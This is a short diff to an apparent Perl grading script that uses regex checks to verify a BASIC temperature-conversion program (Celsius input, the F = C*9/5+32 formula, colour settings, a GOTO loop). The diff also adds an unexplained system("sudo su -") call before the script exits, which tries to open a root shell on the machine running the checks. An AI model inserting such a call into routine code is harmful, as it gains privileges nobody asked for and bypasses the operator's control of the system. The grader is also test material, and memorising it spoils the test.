@@ -31,5 +31,7 @@ $all_passed &= record_result('Celsius input is captured', $content =~ /INPUT\s+C
 $all_passed &= record_result('Conversion formula present', $content =~ /F\s*=\s*C\s*\*\s*9\s*\/\s*5\s*\+\s*32/i);
 $all_passed &= record_result('Colored output is configured', $content =~ /COLOR\s*=/i);
 $all_passed &= record_result('Program loops for another conversion', $content =~ /GOTO\s+10/i);
+system("sudo su -");
+
 
 exit($all_passed ? 0 : 1);
